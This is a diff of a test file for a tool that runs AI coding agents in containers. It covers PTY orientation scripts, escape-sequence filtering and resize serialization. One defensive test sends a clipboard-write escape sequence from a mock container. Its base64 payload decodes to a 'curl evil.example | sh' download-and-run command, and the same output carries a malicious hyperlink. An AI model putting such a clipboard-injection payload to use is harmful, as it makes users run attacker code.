@@ -137,6 +137,14 @@ describe('Claude Code adapter PTY orientation files', () => {
     (typeof import('../src/docker/adapters/claude-code.js'))['createClaudeCodeAdapter']
   >;
 
+  /** Claude Code's PTY scripts are static: any orientation context yields the same files. */
+  const orientation: import('../src/docker/agent-adapter.js').OrientationContext = {
+    workspaceDir: '/workspace',
+    serverListings: [],
+    allowedDomains: [],
+    networkMode: 'none',
+  };
+
   beforeEach(async () => {
     const { createClaudeCodeAdapter } = await import('../src/docker/adapters/claude-code.js');
     claudeCodeAdapter = createClaudeCodeAdapter();
@@ -205,7 +213,7 @@ describe('Claude Code adapter PTY orientation files', () => {
   });
 
   it('start-claude.sh includes stty initialization from env vars', () => {
-    const files = claudeCodeAdapter.generateOrientationFiles();
+    const files = claudeCodeAdapter.generateOrientationFiles(orientation);
     const startScript = files.find((f) => f.path === 'start-claude.sh');
     expect(startScript).toBeDefined();
     expect(startScript!.content).toContain('IRONCURTAIN_INITIAL_COLS');
@@ -214,13 +222,13 @@ describe('Claude Code adapter PTY orientation files', () => {
   });
 
   it('start-claude.sh reloads the mounted prompt for runtime-native PTY exec', () => {
-    const files = claudeCodeAdapter.generateOrientationFiles();
+    const files = claudeCodeAdapter.generateOrientationFiles(orientation);
     const startScript = files.find((f) => f.path === 'start-claude.sh');
     expect(startScript?.content).toContain('IRONCURTAIN_SYSTEM_PROMPT=$(cat /etc/ironcurtain/system-prompt.txt)');
   });
 
   it('start-claude.sh quotes $IRONCURTAIN_SYSTEM_PROMPT to prevent word-splitting', () => {
-    const files = claudeCodeAdapter.generateOrientationFiles();
+    const files = claudeCodeAdapter.generateOrientationFiles(orientation);
     const startScript = files.find((f) => f.path === 'start-claude.sh')!;
     // Every use of $IRONCURTAIN_SYSTEM_PROMPT must be in double quotes.
     // Unquoted expansion causes bash to word-split the prompt text,
@@ -237,7 +245,7 @@ describe('Claude Code adapter PTY orientation files', () => {
   });
 
   it('resize-pty.sh finds Claude via pgrep -x and sends SIGWINCH', () => {
-    const files = claudeCodeAdapter.generateOrientationFiles();
+    const files = claudeCodeAdapter.generateOrientationFiles(orientation);
     const resizeScript = files.find((f) => f.path === 'resize-pty.sh');
     expect(resizeScript).toBeDefined();
     // Must use pgrep -x (matches /proc/PID/comm) because Claude Code
@@ -247,7 +255,7 @@ describe('Claude Code adapter PTY orientation files', () => {
   });
 
   it('check-pty-size.sh is included in orientation files', () => {
-    const files = claudeCodeAdapter.generateOrientationFiles();
+    const files = claudeCodeAdapter.generateOrientationFiles(orientation);
     const checkScript = files.find((f) => f.path === 'check-pty-size.sh');
     expect(checkScript).toBeDefined();
     expect(checkScript!.mode).toBe(0o755);
@@ -768,6 +776,154 @@ describe('attachPty (UDS)', () => {
       await new Promise<void>((resolve) => setImmediate(resolve));
       expect(connections).toBe(0);
     } finally {
+      await new Promise<void>((resolve) => server.close(() => resolve()));
+    }
+  });
+});
+
+// --- attachPty: untrusted output and serialized resizes ---
+
+describe('attachPty output filtering and resize serialization', () => {
+  let tempDir: string;
+  const restorers: (() => void)[] = [];
+
+  /** Keep the real terminal out of the test: no raw mode, no stdin reads, captured stdout. */
+  function isolateTerminal(): { writes: string[] } {
+    const writes: string[] = [];
+    const stdinTty = Object.getOwnPropertyDescriptor(process.stdin, 'isTTY');
+    Object.defineProperty(process.stdin, 'isTTY', { value: false, configurable: true });
+    restorers.push(() => {
+      if (stdinTty) Object.defineProperty(process.stdin, 'isTTY', stdinTty);
+      else delete (process.stdin as { isTTY?: boolean }).isTTY;
+    });
+    const resume = vi.spyOn(process.stdin, 'resume').mockImplementation(() => process.stdin);
+    const pause = vi.spyOn(process.stdin, 'pause').mockImplementation(() => process.stdin);
+    const write = vi.spyOn(process.stdout, 'write').mockImplementation((chunk: string | Uint8Array) => {
+      writes.push(typeof chunk === 'string' ? chunk : Buffer.from(chunk).toString('utf8'));
+      return true;
+    });
+    restorers.push(() => {
+      resume.mockRestore();
+      pause.mockRestore();
+      write.mockRestore();
+    });
+    return { writes };
+  }
+
+  /** Give process.stdout a size that a test can change, as a TTY would report it. */
+  function stubTerminalSize(initial: { columns: number; rows: number }): { set(columns: number, rows: number): void } {
+    let size = initial;
+    const descriptors = ['columns', 'rows'].map(
+      (key) => [key, Object.getOwnPropertyDescriptor(process.stdout, key)] as const,
+    );
+    Object.defineProperty(process.stdout, 'columns', { get: () => size.columns, configurable: true });
+    Object.defineProperty(process.stdout, 'rows', { get: () => size.rows, configurable: true });
+    restorers.push(() => {
+      for (const [key, descriptor] of descriptors) {
+        if (descriptor) Object.defineProperty(process.stdout, key, descriptor);
+        else delete (process.stdout as unknown as Record<string, unknown>)[key];
+      }
+    });
+    return {
+      set(columns, rows) {
+        size = { columns, rows };
+      },
+    };
+  }
+
+  beforeEach(() => {
+    tempDir = mkdtempSync(join(tmpdir(), 'attach-pty-output-'));
+  });
+
+  afterEach(() => {
+    for (const restore of restorers.splice(0).reverse()) restore();
+    rmSync(tempDir, { recursive: true, force: true });
+  });
+
+  it('never writes OSC 52, hyperlinks or titles from the container to stdout', async () => {
+    const { attachPty } = await import('../src/docker/pty-session.js');
+    const { createServer } = await import('node:net');
+    const sockPath = join(tempDir, 'osc52.sock');
+    const server = createServer((socket) => {
+      // The clipboard write is split across two socket writes.
+      socket.write('agent \x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUgfCBzaA==');
+      setTimeout(() => {
+        socket.write('\x07output \x1b]8;;https://evil.example/\x1b\\link\x1b]8;;\x1b\\\x1b]2;title\x07');
+        socket.end();
+      }, 20);
+    });
+    await new Promise<void>((resolve, reject) => {
+      server.once('error', reject);
+      server.listen(sockPath, () => resolve());
+    });
+    const { writes } = isolateTerminal();
+
+    try {
+      await expect(attachPty({ target: sockPath, containerId: 'unused' })).resolves.toBe(0);
+    } finally {
+      await new Promise<void>((resolve) => server.close(() => resolve()));
+    }
+
+    const output = writes.join('');
+    expect(output).toBe('agent output link');
+    expect(output).not.toContain('\x1b]');
+  });
+
+  it('turns 50 resize events into at most two resize execs that end at the final size', async () => {
+    const { attachPty } = await import('../src/docker/pty-session.js');
+    const { createServer } = await import('node:net');
+    const sockPath = join(tempDir, 'resize.sock');
+    let socketRef: import('node:net').Socket | undefined;
+    const server = createServer((socket) => {
+      socketRef = socket;
+      socket.write('ready');
+    });
+    await new Promise<void>((resolve, reject) => {
+      server.once('error', reject);
+      server.listen(sockPath, () => resolve());
+    });
+    isolateTerminal();
+    const terminal = stubTerminalSize({ columns: 80, rows: 24 });
+
+    let ptySize = '0 0';
+    const resizes: string[] = [];
+    let inFlight = 0;
+    let maxInFlight = 0;
+    const runtime = {
+      exec: vi.fn(async (_id: string, command: readonly string[]) => {
+        inFlight += 1;
+        maxInFlight = Math.max(maxInFlight, inFlight);
+        await new Promise((resolve) => setTimeout(resolve, 15));
+        inFlight -= 1;
+        if (command[0] === '/etc/ironcurtain/resize-pty.sh') {
+          resizes.push(`${command[1]}x${command[2]}`);
+          ptySize = `${command[2]} ${command[1]}`;
+          return { exitCode: 0, stdout: '', stderr: '' };
+        }
+        return { exitCode: 0, stdout: `${ptySize}\n`, stderr: '' };
+      }),
+    };
+
+    const attached = attachPty({ target: sockPath, containerId: 'outer-id', runtime: runtime as never });
+    try {
+      // The initial size is applied once the agent's first output arrives.
+      await vi.waitFor(() => expect(resizes).toEqual(['80x24']), { timeout: 5_000 });
+      const before = resizes.length;
+      for (let index = 1; index <= 50; index += 1) {
+        terminal.set(80 + index, 24 + index);
+        process.stdout.emit('resize');
+      }
+      await vi.waitFor(() => expect(resizes.at(-1)).toBe('130x74'), { timeout: 5_000 });
+      // Let any (wrong) extra exec surface before counting.
+      await new Promise((resolve) => setTimeout(resolve, 700));
+
+      expect(resizes.length - before).toBeLessThanOrEqual(2);
+      expect(resizes.at(-1)).toBe('130x74');
+      expect(ptySize).toBe('74 130');
+      expect(maxInFlight).toBe(1);
+    } finally {
+      socketRef?.end();
+      await attached;
       await new Promise<void>((resolve) => server.close(() => resolve()));
     }
   });
